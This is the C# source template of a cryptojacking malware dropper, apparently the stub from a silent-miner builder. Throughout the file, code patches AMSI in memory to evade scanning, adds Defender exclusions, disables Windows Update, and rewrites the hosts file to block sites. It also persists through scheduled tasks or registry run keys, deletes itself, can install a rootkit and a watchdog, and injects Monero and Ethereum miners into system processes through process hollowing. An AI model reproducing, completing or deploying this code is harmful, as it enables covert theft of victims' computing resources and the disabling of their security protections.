using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

public partial class _rProgram_
{
    public static void Main()
    {
        try
        {
            try
            {
#if DefWDExclusions
            
                _rCommand_("#SPOWERSHELL", "#WDCOMMANDS", true);
#endif
#if DefStartDelay
                Thread.Sleep(startDelay * 1000);
#endif
                _rPatchAMSI_();
#if DefDisableWindowsUpdate
                _rCommand_("#SCMD", "#WUPDATE");
#endif
#if DefDisableSleep
                _rCommand_("#SCMD", "#POWERCFG");
#endif
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("MBC: " + Environment.NewLine + ex.ToString());
#endif
            }
#if DefBlockWebsites
            try
            {
                string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
                string _rhostscontent_ = File.ReadAllText(_rhostspath_);

                string[] _rdomainset_ = new string[] { DOMAINSET };
                using (StreamWriter _rw_ = File.AppendText(_rhostspath_))
                {
                    foreach (string _rset_ in _rdomainset_)
                    {
                        string _rcur_ = _rGetString_(_rset_);
                        if (!_rhostscontent_.Contains(" " + _rcur_))
                        {
                            _rw_.Write(string.Format("#HOSTSFORMAT", _rcur_));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("MBW: " + Environment.NewLine + ex.ToString());
#endif
            }
#endif
            string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
            string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");
#if DefInstall
            try
            {
                string _rplp_ = PayloadPath;    
#if DefShellcode
                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
#else
                string _rcmdl_ = Assembly.GetExecutingAssembly().Location;
#endif
                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                {
                    string _rpayloadcommand_ = $PAYLOADCOMMAND;
#if DefNoMinerOverwrite
                    if(File.Exists(_rplp_)){
#if DefRunInstall
                        _rCommand_("#SPOWERSHELL", _rpayloadcommand_);
#endif
                        Environment.Exit(0);
                    }
#endif
#if DefRootkit
                    try
                    {
                        _rRun_(_rExtractFile_(_rGetTheResource_("#RES_rootkit_i"), "st"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), null);                  
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("MRK: " + ex.ToString());
#endif
                    }
#endif
#if DefWatchdog
                    _rFindWatchdog_(true);
#endif

                    try{
                        Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));                       
                        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            if (Environment.OSVersion.Version < new Version(6, 2))
                            {
                                _rCommand_("#SCMD", string.Format("#WIN7TASKSCHADD", _rplp_));
                                File.Copy(_rcmdl_, _rplp_, true);
                                _rCommand_("#SCMD", "#WIN7TASKSCHSTART");
                            }
                            else
                            {
                                _rCommand_("#SPOWERSHELL", string.Format("#ECTEMPLATE", Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format("#TASKSCHADD", _rplp_.Replace("'", "''"), _rcmdl_.Replace("'", "''"), _rpayloadcommand_)))), true);
                            }
                        }
                        else
                        {
                            _rCommand_("#SCMD", string.Format("#REGADD", _rplp_));
                            Thread.Sleep(2000);
                            File.Copy(_rcmdl_, _rplp_, true);
                            Thread.Sleep(2000);
#if DefRunInstall
                            _rCommand_("#SPOWERSHELL", _rpayloadcommand_);
#endif
                        }
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("MAE: " + ex.ToString());
#endif
                    }
#if DefAutoDelete
                    _rCommand_("#SCMD", string.Format("#CMDDELETE", _rcmdl_));
#endif
                    Environment.Exit(0);
                }
            }
            catch(Exception ex){
#if DefDebug
                MessageBox.Show("MFI: " + ex.ToString());
#endif
            }
#endif

            try
            {
                try
                {
                    Directory.CreateDirectory(_rbD_);
                    Directory.CreateDirectory(_rbD2_);
#if DefWatchdog
                    if (!_rFindWatchdog_())
                    {
#if DefMemoryWatchdog
                        _rRun_(_rGetTheResource_("#RES_watchdog"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#WATCHDOGINJ"), "#WATCHDOGID", true);
#else
                        File.WriteAllBytes(Path.Combine(_rbD2_, "#WATCHDOGNAME" + "#STREXE"), _rGetTheResource_("#RES_watchdog"));

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.Combine(_rbD2_, "#WATCHDOGNAME" + "#STREXE"),
                            WorkingDirectory = _rbD2_,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        });
#endif
                    }
#endif
#if DefXMR
                    File.WriteAllBytes(Path.Combine(_rbD_, "#WR64"), _rGetTheResource_("#RES_winring"));
#endif
                }
                catch (Exception ex)
                {
#if DefDebug
                    MessageBox.Show("MW: " + Environment.NewLine + ex.ToString());
#endif
                }

                byte[] _rxmr_ = { };
                byte[] _reth_ = { };

                bool _rGPU_ = _rGetGPU_();

#if DefGPU
                try
                {
                    if (_rGPU_)
                    {
                        byte[] _li_ = _rGetTheResource_("#RES_libs");

                        if (_li_.Length > 0) {
                            using (var _rarchive_ = new ZipArchive(new MemoryStream(_li_)))
                            {
                                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries){
                                    _rentry_.ExtractToFile(Path.Combine(_rbD_, _rentry_.FullName), true);
                                }
                            }
                        }
                    }
                }
                catch(Exception ex){
#if DefDebug
                    MessageBox.Show("MLE: " + Environment.NewLine + ex.ToString());
#endif
                }
#endif

                try
                {
#if DefXMR
                    _rxmr_ = _rExtractFile_(_rGetTheResource_("#RES_xmr"), "mr");
#endif
#if DefETH

                    _reth_ = _rExtractFile_(_rGetTheResource_("#RES_eth"), "th");
#endif

                    string _rrunningminers_ = _rGetMiners_();

                    string[][] _rminerset_ = new string[][] { MINERSET };

                    foreach (string[] _set_ in _rminerset_)
                    {
                        if (!_rrunningminers_.Contains(_set_[0]) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rGPU_)))
                        {
                            _rRun_((_set_[1] == "#XID" ? _rxmr_ : _reth_), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_(_set_[3])), _set_[2]);
                        }
                    }

                }
                catch (Exception ex)
                {
#if DefDebug
                MessageBox.Show("MMR: " + Environment.NewLine + ex.ToString());
#endif
                }
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("MMC: " + Environment.NewLine + ex.ToString());
#endif
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("MFC: " + Environment.NewLine + ex.ToString());
#endif
        }
        Environment.Exit(0);
    }

    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RES_parent", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }


    public static string _rGetString_(string _rarg1_)
    {
#if DefObfuscate
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
#else
        return _rarg1_;
#endif
    }

    public static bool _rGetGPU_()
    {
        try
        {
            string _rarg7_ = "";

            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope("#WMISCOPE", _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                _rarg7_ += (" " + MemObj["#STRVIDEOP"] + " " + MemObj["#STRNAME"]);
            }

            return _rarg7_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }

    public static string _rGetMiners_()
    {
        string _rminers_ = "";

        var _rarg1_ = new ConnectionOptions();
        _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
        var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
        _rarg2_.Connect();

        var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#MINERQUERY")).Get();
        foreach (ManagementObject MemObj in _rarg3_)
        {
            if (MemObj != null && MemObj["#STRCMDLINE"] != null && MemObj["#STRCMDLINE"].ToString().Contains("#MINERID"))
            {
                _rminers_ += MemObj["#STRCMDLINE"].ToString();
            }
        }
        return _rminers_;
    }

#if DefWatchdog
    public static bool _rFindWatchdog_(bool _rkill_ = false)
    {
        try
        {
            foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
            {
                proc.Kill();
            }

            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#WATCHDOGQUERY")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["#STRCMDLINE"] != null && MemObj["#STRCMDLINE"].ToString().Contains("#WATCHDOGID"))
                {
                    if(_rkill_){
                        _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["#STRPROCID"]));
                    }else{
                        return true;
                    }
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }
#endif

    public static void _rCommand_(string _rarg1_, string _rarg2_, bool _rwait_ = false)
    {
        try
        {
            var _rproc_ = Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            if (_rwait_)
            {
                _rproc_.WaitForExit();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] _rExtractFile_(byte[] _rinput_, string _rcontains_)
    {
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rinput_)))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains(_rcontains_))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                return _rms_.ToArray();
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
                        MessageBox.Show("RK: " + ex.ToString());
#endif
        }
        return new byte[] { };
    }

    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_, bool _rshellcode_ = false)
    {
        try
        {
            Assembly.Load(_rGetTheResource_("#RES_runpe")).GetType("#RUNPETYPE").GetMethod(_rshellcode_ ? "#SHELLCODEMETHOD" : "#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("RPE: " + ex.ToString());
#endif
        }
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    public static void _rPatchAMSI_()
    {
        try
        {
            var _rasb_ = GetProcAddress(LoadLibrary("#AMSIDLL"), "#AMSIBUFFER");
            var _rpatch_ = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            uint _roldProtect_ = 0;
            VirtualProtect(_rasb_, (UIntPtr)_rpatch_.Length, 0x40, out _roldProtect_);
            Marshal.Copy(_rpatch_, 0, _rasb_, _rpatch_.Length);
            VirtualProtect(_rasb_, (UIntPtr)_rpatch_.Length, _roldProtect_, out _roldProtect_);
        }
        catch { }
    }

    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
#if DefObfuscate
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
#else
        return _rinput_;
#endif
    }
}